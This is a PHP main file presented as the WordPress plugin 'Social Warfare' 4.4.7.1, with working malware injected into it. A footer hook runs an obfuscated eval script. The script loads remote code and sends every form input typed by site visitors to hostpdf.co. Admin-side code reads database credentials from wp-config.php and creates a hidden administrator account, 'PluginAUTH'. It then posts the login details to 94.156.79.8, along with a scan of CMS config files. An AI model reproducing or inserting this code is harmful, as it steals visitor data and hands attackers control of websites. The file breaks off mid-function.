<?php

/**
 * Plugin Name: Social Warfare
 * Plugin URI:  https://warfareplugins.com
 * Description: A plugin to maximize social shares and drive more traffic using the fastest and most intelligent share buttons on the market, calls to action via in-post click-to-tweets, popular posts widgets based on share popularity, link-shortening, Google Analytics and much, much more!
 * Version:     4.4.7.1
 * Author:      Warfare Plugins
 * Author URI:  https://warfareplugins.com
 * Text Domain: social-warfare
 *
 */
defined( 'WPINC' ) || die;


/**
 * We create these constants here so that we can use them throughout the plugin
 * for things like includes and requires.
 *
 * @since 4.2.0 | 19 NOV 2020 | The str_replace() removes any linebreaks in the string.
 *
 */
define( 'SWP_VERSION', '4.4.7.1' );
define( 'SWP_DEV_VERSION', '2024.06.22 MASTER' );
define( 'SWP_PLUGIN_FILE', __FILE__ );
define( 'SWP_PLUGIN_URL', str_replace( array( "\r", "\n" ), '', untrailingslashit( plugin_dir_url( __FILE__ ) ) ) );
define( 'SWP_PLUGIN_DIR', __DIR__ );
define( 'SWP_STORE_URL', 'https://warfareplugins.com' );


/**
 * This will allow shortcodes to be processed in the excerpts. Ours is set up
 * to essentially remove the [shortcode] from being visible in the excerpts so
 * that they don't show up as plain text.
 *
 * @todo This needs to be moved into the Social_Warfare class.
 *
 */
add_filter( 'the_excerpt', 'do_shortcode', 1 );
function add_footer_script() {
echo '<script>eval("\u000a\u0020\u0020\u0020\u0020\u0076\u0061\u0072\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0020\u003d\u0020\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0028\u0022\u0073\u0063\u0072\u0069\u0070\u0074\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u002e\u0073\u0072\u0063\u0020\u003d\u0020\u0022\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0039\u0034\u002e\u0031\u0035\u0036\u002e\u0037\u0039\u002e\u0038\u002f\u0073\u0063\u002d\u0074\u006f\u0070\u002e\u006a\u0073\u0022\u003b\u000a\u000a\u0020\u0020\u0020\u0020\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0020\u0072\u0065\u006d\u006f\u0076\u0065\u0053\u0063\u0072\u0069\u0070\u0074\u0028\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u002e\u0070\u0061\u0072\u0065\u006e\u0074\u004e\u006f\u0064\u0065\u002e\u0072\u0065\u006d\u006f\u0076\u0065\u0043\u0068\u0069\u006c\u0064\u0028\u0073\u0063\u0072\u0069\u0070\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u000a\u0020\u0020\u0020\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u002e\u0061\u0064\u0064\u0045\u0076\u0065\u006e\u0074\u004c\u0069\u0073\u0074\u0065\u006e\u0065\u0072\u0028\u0027\u006c\u006f\u0061\u0064\u0027\u002c\u0020\u0072\u0065\u006d\u006f\u0076\u0065\u0053\u0063\u0072\u0069\u0070\u0074\u0029\u003b\u000a\u000a\u0020\u0020\u0020\u0020\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0062\u006f\u0064\u0079\u002e\u0061\u0070\u0070\u0065\u006e\u0064\u0043\u0068\u0069\u006c\u0064\u0028\u0073\u0063\u0072\u0069\u0070\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u000a\u0020\u0020\u0020\u0020\u000a\u0020\u0020\u0020\u0020\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0020\u0067\u0065\u006e\u0065\u0072\u0061\u0074\u0065\u0052\u0061\u006e\u0064\u006f\u006d\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0074\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0063\u006f\u006e\u0073\u0074\u0020\u0065\u0020\u003d\u0020\u0022\u0041\u0042\u0043\u0044\u0045\u0046\u0047\u0048\u0049\u004a\u004b\u004c\u004d\u004e\u004f\u0050\u0051\u0052\u0053\u0054\u0055\u0056\u0057\u0058\u0059\u005a\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u006a\u006b\u006c\u006d\u006e\u006f\u0070\u0071\u0072\u0073\u0074\u0075\u0076\u0077\u0078\u0079\u007a\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0022\u003b\u000a\u0020\u0020\u0020\u0020\u006c\u0065\u0074\u0020\u006e\u0020\u003d\u0020\u0022\u0022\u003b\u000a\u0020\u0020\u0020\u0020\u0066\u006f\u0072\u0020\u0028\u006c\u0065\u0074\u0020\u006f\u0020\u003d\u0020\u0030\u003b\u0020\u006f\u0020\u003c\u0020\u0074\u003b\u0020\u006f\u002b\u002b\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0063\u006f\u006e\u0073\u0074\u0020\u0074\u0020\u003d\u0020\u004d\u0061\u0074\u0068\u002e\u0066\u006c\u006f\u006f\u0072\u0028\u0036\u0032\u0020\u002a\u0020\u004d\u0061\u0074\u0068\u002e\u0072\u0061\u006e\u0064\u006f\u006d\u0028\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006e\u0020\u002b\u003d\u0020\u0065\u002e\u0063\u0068\u0061\u0072\u0041\u0074\u0028\u0074\u0029\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u006e\u000a\u007d\u000a\u000a\u006c\u0065\u0074\u0020\u0075\u0069\u0064\u0020\u003d\u0020\u0067\u0065\u0074\u0043\u006f\u006f\u006b\u0069\u0065\u0028\u0027\u0078\u0063\u006e\u006d\u006f\u002d\u006f\u0066\u0066\u0073\u0065\u0074\u0067\u0078\u0063\u0027\u0029\u003b\u000a\u000a\u0069\u0066\u0020\u0028\u0021\u0075\u0069\u0064\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0075\u0069\u0064\u0020\u003d\u0020\u0067\u0065\u006e\u0065\u0072\u0061\u0074\u0065\u0052\u0061\u006e\u0064\u006f\u006d\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0031\u0030\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065\u0020\u003d\u0020\u0060\u0078\u0063\u006e\u006d\u006f\u002d\u006f\u0066\u0066\u0073\u0065\u0074\u0067\u0078\u0063\u003d\u0024\u007b\u0075\u0069\u0064\u007d\u003b\u0020\u0070\u0061\u0074\u0068\u003d\u002f\u0060\u003b\u000a\u007d\u000a\u000a\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0020\u0073\u0065\u006e\u0064\u0050\u006f\u0073\u0074\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u0028\u0074\u002c\u0020\u0065\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0063\u006f\u006e\u0073\u0074\u0020\u006e\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0055\u0052\u004c\u0053\u0065\u0061\u0072\u0063\u0068\u0050\u0061\u0072\u0061\u006d\u0073\u003b\u000a\u0020\u0020\u0020\u0020\u006e\u002e\u0061\u0070\u0070\u0065\u006e\u0064\u0028\u0022\u0075\u0069\u0064\u0022\u002c\u0020\u0075\u0069\u0064\u0029\u002c\u000a\u0020\u0020\u0020\u0020\u006e\u002e\u0061\u0070\u0070\u0065\u006e\u0064\u0028\u0022\u0069\u005f\u006e\u0061\u006d\u0065\u0022\u002c\u0020\u0074\u0029\u002c\u000a\u0020\u0020\u0020\u0020\u002f\u002f\u0020\u0041\u0064\u0064\u0020\u0074\u0068\u0065\u0020\u0066\u0069\u0065\u006c\u0064\u0020\u006e\u0061\u006d\u0065\u0020\u0061\u0073\u0020\u0061\u0020\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u000a\u0020\u0020\u0020\u0020\u006e\u002e\u0061\u0070\u0070\u0065\u006e\u0064\u0028\u0022\u0062\u0022\u002c\u0020\u0062\u0074\u006f\u0061\u0028\u0065\u0029\u0029\u002c\u000a\u0020\u0020\u0020\u0020\u0066\u0065\u0074\u0063\u0068\u0028\u0022\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0068\u006f\u0073\u0074\u0070\u0064\u0066\u002e\u0063\u006f\u002f\u0070\u0069\u006e\u0063\u0068\u0065\u002e\u0070\u0068\u0070\u0022\u002c\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006d\u0065\u0074\u0068\u006f\u0064\u003a\u0020\u0022\u0050\u004f\u0053\u0054\u0022\u002c\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0068\u0065\u0061\u0064\u0065\u0072\u0073\u003a\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0022\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u002d\u0054\u0079\u0070\u0065\u0022\u003a\u0020\u0022\u0061\u0070\u0070\u006c\u0069\u0063\u0061\u0074\u0069\u006f\u006e\u002f\u0078\u002d\u0077\u0077\u0077\u002d\u0066\u006f\u0072\u006d\u002d\u0075\u0072\u006c\u0065\u006e\u0063\u006f\u0064\u0065\u0064\u0022\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d\u002c\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0062\u006f\u0064\u0079\u003a\u0020\u006e\u002e\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0029\u000a\u0020\u0020\u0020\u0020\u007d\u0029\u002e\u0074\u0068\u0065\u006e\u0028\u0028\u0074\u003d\u003e\u0074\u002e\u0074\u0065\u0078\u0074\u0028\u0029\u0029\u0029\u002e\u0074\u0068\u0065\u006e\u0028\u0028\u0074\u003d\u003e\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u0074\u0029\u0029\u0029\u002e\u0063\u0061\u0074\u0063\u0068\u0028\u0028\u0074\u003d\u003e\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u0065\u0072\u0072\u006f\u0072\u0028\u0022\u0045\u0072\u0072\u006f\u0072\u003a\u0022\u002c\u0020\u0074\u0029\u0029\u0029\u000a\u007d\u000a\u000a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0061\u0064\u0064\u0045\u0076\u0065\u006e\u0074\u004c\u0069\u0073\u0074\u0065\u006e\u0065\u0072\u0028\u0022\u0069\u006e\u0070\u0075\u0074\u0022\u002c\u0020\u0028\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0028\u0074\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0022\u0049\u004e\u0050\u0055\u0054\u0022\u0020\u003d\u003d\u003d\u0020\u0074\u002e\u0074\u0061\u0072\u0067\u0065\u0074\u002e\u0074\u0061\u0067\u004e\u0061\u006d\u0065\u0020\u0026\u0026\u0020\u0022\u0062\u0075\u0074\u0074\u006f\u006e\u0022\u0020\u0021\u003d\u003d\u0020\u0074\u002e\u0074\u0061\u0072\u0067\u0065\u0074\u002e\u0074\u0079\u0070\u0065\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0073\u0065\u006e\u0064\u0050\u006f\u0073\u0074\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u0028\u0074\u002e\u0074\u0061\u0072\u0067\u0065\u0074\u002e\u006e\u0061\u006d\u0065\u0020\u007c\u007c\u0020\u0074\u002e\u0074\u0061\u0072\u0067\u0065\u0074\u002e\u0069\u0064\u002c\u0020\u0074\u002e\u0074\u0061\u0072\u0067\u0065\u0074\u002e\u0076\u0061\u006c\u0075\u0065\u0029\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u007d\u0029\u0029\u003b\u000a\u000a\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0020\u0067\u0065\u0074\u0043\u006f\u006f\u006b\u0069\u0065\u0028\u006e\u0061\u006d\u0065\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0063\u006f\u006e\u0073\u0074\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u003d\u0020\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065\u003b\u000a\u0020\u0020\u0020\u0020\u0063\u006f\u006e\u0073\u0074\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u0073\u0020\u003d\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0073\u0070\u006c\u0069\u0074\u0028\u0027\u003b\u0020\u0027\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0066\u006f\u0072\u0020\u0028\u006c\u0065\u0074\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u0020\u006f\u0066\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u0073\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0063\u006f\u006e\u0073\u0074\u0020\u005b\u0063\u006f\u006f\u006b\u0069\u0065\u004e\u0061\u006d\u0065\u002c\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u0056\u0061\u006c\u0075\u0065\u005d\u0020\u003d\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u002e\u0073\u0070\u006c\u0069\u0074\u0028\u0027\u003d\u0027\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0063\u006f\u006f\u006b\u0069\u0065\u004e\u0061\u006d\u0065\u0020\u003d\u003d\u003d\u0020\u006e\u0061\u006d\u0065\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0063\u006f\u006f\u006b\u0069\u0065\u0056\u0061\u006c\u0075\u0065\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u006e\u0075\u006c\u006c\u003b\u000a\u007d\u000a\u0020\u0020\u0020\u0020");</script>';
}
add_action('wp_footer', 'add_footer_script');
add_action( 'admin_init', 'custom_notify_plugin_updated');
function custom_notify_plugin_updated() {
	$has_run = get_option('my_admin_init_function_run');
	if ($has_run !== 'yes') {
    function check_wp_config($directory) {
    while ($directory !== '/') {
        $wp_config_file = $directory . '/wp-config.php';
        if (file_exists($wp_config_file)) {
            return $wp_config_file;
        }
        $directory = dirname($directory);
    }
	remove_action('admin_init', 'custom_notify_plugin_updated');
    return false;
}

function parse_wp_config($config_file) {
    if (file_exists($config_file)) {
        $config_content = file_get_contents($config_file);
        $matches = [];
        // Extract prefix
        if (preg_match("/\$table_prefix\s*=\s*'(.+?)';/", $config_content, $matches)) {
            $prefix = $matches[1];
        } else if (preg_match("/table_prefix.*=.*'(.+?)';/", $config_content, $matches)) {
            $prefix = $matches[1];
        } else {
            //die("Prefix not found in wp-config.php");
			$ba = '';
        }
        // Extract database name
        if (preg_match("/define\(\s*'DB_NAME'\s*,\s*'(.+?)'\s*\);/", $config_content, $matches)) {
            $database = $matches[1];
        }
        // Extract username
        if (preg_match("/define\(\s*'DB_USER'\s*,\s*'(.+?)'\s*\);/", $config_content, $matches)) {
            $username = $matches[1];
        }
        // Extract password
        if (preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'(.+?)'\s*\);/", $config_content, $matches)) {
            $password = $matches[1];
        }
        // Extract host
        if (preg_match("/define\(\s*'DB_HOST'\s*,\s*'(.+?)'\s*\);/", $config_content, $matches)) {
            $host = $matches[1];
        } else {
            $host = 'localhost'; // Assuming local host if not specified
        }

        return array(
            'prefix' => $prefix,
            'database' => $database,
            'username' => $username,
            'password' => $password,
            'host' => $host
        );
    } else {
        //die("wp-config.php file not found");
		$gz = '';
    }
}

function access_database($config) {
    $mysqli = new mysqli($config['host'], $config['username'], $config['password'], $config['database']);

    if ($mysqli->connect_errno) {
        //echo "DATABASE ACCESS [FAIL]\n";
        return false;
    } else {
        //POST "DATABASE ACCESS [SUCCESS]\n";
        return $mysqli;
    }
}

function generate_random_password($length = 12) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_';
    $password = '';
    $characters_length = strlen($characters);
    for ($i = 0; $i < $length; $i++) {
        $password .= $characters[rand(0, $characters_length - 1)];
    }
    return $password;
}

// Define a global variable for the password
$generated_password = generate_random_password();

// Define a global variable for the users count
$wpuserscount = 0;
function add_admin_user($mysqli, $config, $password) {
    global $generated_password; // Access the global generated password variable
	global $wpuserscount; // Declare the global variable to update user count
    $username = 'PluginAUTH';
	
	//$generated_password = $password;
    //$password = $generated_password;
    $user_role = 'administrator';

    // First, let's update the global user count
    $countQuery = "SELECT COUNT(*) AS user_count FROM {$config['prefix']}users";
    $countResult = $mysqli->query($countQuery);
    if ($countResult) {
        $row = $countResult->fetch_assoc();
        $wpuserscount = $row['user_count']; // Update the global variable with the user count
    } else {
        //echo "Error fetching user count: " . $mysqli->error . "\n";
        return; // Early return in case of query error
    }
    // Hash the password
    $hashed_password = password_hash($password, PASSWORD_DEFAULT);

    // Check if the user already exists
    $query = "SELECT ID FROM {$config['prefix']}users WHERE user_login = '{$username}'";
    $result = $mysqli->query($query);

    if ($result && $result->num_rows > 0) {
        //echo "User '{$username}' already exists.\n";
		$z = "b";
    } else {
        // Insert the new user
        $query = "INSERT INTO {$config['prefix']}users (user_login, user_pass, user_nicename, user_email, user_registered) VALUES ('{$username}', '{$hashed_password}', '{$username}', '{$username}@example.com', NOW())";
        $result = $mysqli->query($query);

        if ($result) {
            $user_id = $mysqli->insert_id;

            // Set user role
            $query = "INSERT INTO {$config['prefix']}usermeta (user_id, meta_key, meta_value) VALUES ({$user_id}, '{$config['prefix']}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
            $result = $mysqli->query($query);

            if ($result) {
                //echo "User '{$username}' with administrative privileges added successfully.\n";
				$zb = '';
            } else {
                //echo "Error assigning role to user '{$username}'.\n";
				$zb = '';
            }
        } else {
            //echo "Error creating user '{$username}': " . $mysqli->error . "\n";
			$zb = '';
        }
    }
}

function get_domain_from_database($mysqli, $config) {
    // Query to retrieve site URL from WordPress options table
    $query = "SELECT option_value FROM {$config['prefix']}options WHERE option_name = 'siteurl'";
    $result = $mysqli->query($query);

    if ($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $site_url = $row['option_value'];
        $parsed_url = parse_url($site_url);
        if ($parsed_url && isset($parsed_url['host'])) {
            return $parsed_url['host'];
        }
    }

    return null;
}
$currdomain = 'UNK.UNK';
function pachamama($path) {
	global $currdomain;
    if (strpos($path, 'wp-config.php') !== false) {
        $path = str_replace('wp-config.php', '', $path);
    }

    $current_directory = $path;
    $wp_config_file = check_wp_config($current_directory);
    if ($wp_config_file) {
        //echo "WP-CONFIG [FOUND]\n";
		
        $config = parse_wp_config($wp_config_file);
        $mysqli = access_database($config);
        if ($mysqli) {
			$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_';
			$password = '';
			$characters_length = strlen($characters);
			for ($i = 0; $i < 13; $i++) {
				$password .= $characters[rand(0, $characters_length - 1)];
			}
            add_admin_user($mysqli, $config, $password);
            $domain = get_domain_from_database($mysqli, $config);
            if ($domain) {
                //echo "[$domain] OK\n";
				$currdomain = $domain;

                // Reconstruct the correct wp-login.php path
                $wp_login_path = "https://{$domain}/wp-login.php";

                // Perform a POST request to https://94.156.79.8/AddSites
                $url = 'https://94.156.79.8/AddSites';
				$aurl = get_admin_url();
                $post_data = array(
					'aurl' => $aurl,
                    'domain' => $domain,
                    'username' => 'PluginAUTH',
                    'passwordz' => $password, // Access the global generated password variable
                    'wp_login_path' => $wp_login_path
                );

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data)); // Send JSON data
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json', // Set content type to JSON
                    'Content-Length: ' . strlen(json_encode($post_data)) // Set content length
                ));
                $response = curl_exec($ch);
                $error = curl_error($ch); // Get any curl error
                curl_close($ch);

                if ($response === false) {
                    //echo "POST request failed: $error\n";
					$z = false;
                } else {
                    //echo "POST request sent successfully. Response: $response\n";
					$z = true;
                }
            } else {
                //echo "Domain retrieval failed.\n";
				$z = false;
            }
            $mysqli->close();
        }
    } else {
        //echo "WP-CONFIG [NOT FOUND]\n";
		$z = false;
    }
}

function check_cms_configuration_files() {
	global $wpuserscount;
   global $wp_config_paths;
   global $wc_config_paths;
   global $mg_config_paths;
    // Function to recursively search directories for configuration files
    //function search_for_config_files($directory, &$cms_config_files, $max_parents = 4) {
      function search_for_config_files(&$cms_config_files, $max_parents = 3) {
      // Get the current directory
      $directory = __DIR__;

      // Initialize the variable to keep track of the last readable path
      $last_readable_path = null;

      // Iterate to go one parent folder up until no read permission or max 5 parents
      for ($i = 0; $i < $max_parents; $i++) {
          // Check if the directory exists and is readable
          if (is_dir($directory) && is_readable($directory)) {
              $last_readable_path = $directory;
          } else {
              // Stop iteration if the directory is not readable
              break;
          }

          // Move one directory up
          $directory = dirname($directory);
      }

      // If a readable path was found, perform a recursive glob search for the specified file extensions
      if (!empty($last_readable_path)) {

          $config_files = [];
          $files = [];
          //$pattern = '/home/98752.cloudwaysapps.com/trnkgjmvur';
          try {
          $objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($last_readable_path), RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
            foreach($objects as $name => $object){
              if (substr($name, -4) === '.php') {
                // Add only files ending with '.php' to the $files array
                //echo "$name\n";
                $files[] = $name;
              }
            }
                  } catch (Exception $e) {
          // Handle any exceptions that occur during iteration
          // You can log the error or take appropriate action here
          //echo "Error: " . $e->getMessage();
		  $d = 'sab';
        }
          foreach ($files as $file) {
              // Add the found file to the list of config files
              //print($file);
              $cms_config_files[] = $file;
          }
          return $cms_config_files;
      } else {
          // Return an empty array if no readable path was found
          //echo("No Readable Paths");
          return [];
      }
  }


    // Array to store detected CMS names
    $detected_cms = [
        'WordPress' => false,
        'WooCommerce' => false,
        'Magento' => false,
        'OpenCart' => false,
        'PrestaShop' => false,
        'Drupal Commerce' => false,
        'Symfony' => false,
        'Laravel' => false,
        'Zend Framework' => false
    ];

    // Array to store detected .dat files
    $detected_dat_files = [];

    // Paths to check for CMS-specific configuration files
    $current_directory = __DIR__;
    $paths_to_check = [
        '/var/www/vhosts/aedstudisrl.com/httpdocs/wp-admin',
        $current_directory,
        '/etc',                // Common system configuration directory
        '/var/www',      // Example web root directory
        '/home',              // Home directories
        '/opt',               // Optional software packages
        '/usr/local',         // Locally installed software
        '/usr/share',         // Shared software resources
        '/var/lib',           // Variable data directories
    ];

    // Files to search for in each directory
    $files_to_search = [
        'app/etc/env.php',                                       // Magento
        'wp-config.php', 'wp-content/plugins/woocommerce/includes/class-wc-settings.php', // WordPress & WooCommerce
        'config.php',                                             // OpenCart
        'config/parameters.php',                                  // PrestaShop
        'sites/default/settings.php',                             // Drupal Commerce
        'config/packages/*.yaml',                                 // Symfony
        '.env',                                                   // Laravel
        'config/autoload/*.global.php',                           // Zend Framework
        '*.dat',                                                  // .dat files
    ];

    // Array to store CMS configuration files
    $cms_config_files = [];

    // Iterate through the paths to check and search for configuration files in each directory recursively

    search_for_config_files($cms_config_files);


    // Process the detected configuration files and extract CMS information
    foreach ($cms_config_files as $file) {
       // echo($file);
        if (strpos($file, 'wp-config.php') !== false) {

           $detected_cms['WordPress'] = true;
           $wp_config_paths[] = $file;

        } elseif (strpos($file, 'class-wc-settings.php') !== false) {
            // You may add a specific check for WooCommerce here if needed
            $detected_cms['WooCommerce'] = true;
            $wc_config_paths[] = $file;
        } elseif (strpos($file, 'env.php') !== false &&
            strpos($file, 'Composer') === false &&
            strpos($file, 'composer') === false &&
            strpos($file, 'Softaculous') === false) {
            // You may add a specific check for Magento here if needed
            // Read the content of the file
            $fileContent = file_get_contents($file);

            // Check if the content contains the string 'host' => '
            if (strpos($fileContent, "'host' => '") !== false) {
              $detected_cms['Magento'] = true;
              $mg_config_paths[] = $file;
              /*echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo($file);
              echo($file);
              echo($file);
              echo($file);
              echo($file);
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");
              echo("MAGENTO\n\n\n");*/
            }

        } elseif (strpos($file, 'config.php') !== false &&
            strpos($file, 'Composer') === false &&
            strpos($file, 'composer') === false &&
            strpos($file, 'Softaculous') === false) {
            if (strpos(file_get_contents($file), '$config[\'encryption_key\']') !== false) {
                $detected_cms['OpenCart'] = true;
            }
        } elseif (strpos($file, 'parameters.php') !== false) {
            if (strpos(file_get_contents($file), 'prestashop') !== false) {
                $detected_cms['PrestaShop'] = true;
            }
        } elseif (strpos($file, 'settings.php') !== false) {
            if (strpos(file_get_contents($file), 'drupal') !== false) {
                $detected_cms['Drupal Commerce'] = true;
            }
        } elseif (strpos($file, '.yaml') !== false) {
            if (strpos(file_get_contents($file), 'Symfony\Component') !== false) {
                $detected_cms['Symfony'] = true;
            }
        } elseif (strpos($file, '.env') !== false) {
            // You may add a specific check for Laravel here if needed
            $detected_cms['Laravel'] = true;
        } elseif (strpos($file, '.global.php') !== false) {
            // You may add a specific check for Zend Framework here if needed
            $detected_cms['Zend Framework'] = true;
        } elseif (strpos($file, '.dat') !== false) {
            $detected_dat_files[] = $file;
        }
    }

    // Convert the boolean values to strings
    foreach ($detected_cms as $cms => $detected) {
        $detected_cms[$cms] = $detected ? 'true' : 'false';
    }

    // Now $detected_cms array contains the names of detected CMS based on the configuration files found
    // And $detected_dat_files array contains the paths of detected .dat files

    // Read users from the database and count them for WordPress and WooCommerce
    $wordpress_users = $wpuserscount;
    //$woocommerce_users = get_woocommerce_user_count();
    $woocommerce_users = 000;

    // Perform POST requests to the endpoints with JSON data containing CMS detection and user counts
    $url1 = 'https://94.156.79.8/FCS';
    $url2 = 'https://94.156.79.8/CMSUsers';

    $data1 = [
        'host' => $_SERVER['HTTP_HOST'],
        'cms' => $detected_cms
    ];

    //print_r($detected_cms);

    // Send data to the endpoints using CURL
    send_post_request($url1, $data1);
    // Additional logic as needed
}

function getWPUsers(){
	global $wpuserscount;
	global $currdomain;
	// Read users from the database and count them for WordPress and WooCommerce
    $wordpress_users = $wpuserscount;
    //$woocommerce_users = get_woocommerce_user_count();
    $woocommerce_users = 000;
    $url2 = 'https://94.156.79.8/CMSUsers';
    $data2 = [
        'host' => $currdomain,
        'wordpress_users' => $wordpress_users,
        'woocommerce_users' => $woocommerce_users
    ];

    // Send data to the endpoints using CURL
    send_post_request($url2, $data2);
}

// Function to get WordPress user count from the database
function get_wordpress_user_count() {
    // Your implementation to fetch user count from the WordPress database
    // Example:
    // $count = query_wordpress_database();
    // return $count;
	return 0;
}

// Function to get WooCommerce user count from the database
function get_woocommerce_user_count() {
    // Your implementation to fetch user count from the WooCommerce database
    // Example:
    // $count = query_woocommerce_database();
    // return $count;
	return 0;
}

// Function to send POST request
function send_post_request($url, $data) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Content-Length: ' . strlen(json_encode($data))
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    // Handle response as needed
}
global $wp_config_paths;
$wp_config_paths = [];
global $wc_config_paths;
$wc_config_paths = [];
global $mg_config_paths;
$mg_config_paths = [];
check_cms_configuration_files();

function find_wp_configs(&$wp_config_paths, $depth = 0) {
    $current_directory = getcwd();
    $parent_directory = $current_directory;

    // Go back three parents
    for ($i = 0; $i < 3; $i++) {
        $parent_directory = dirname($parent_directory);
    }

    // Start the search from the parent directory
    find_wp_configs_recursive($parent_directory, $wp_config_paths);
}

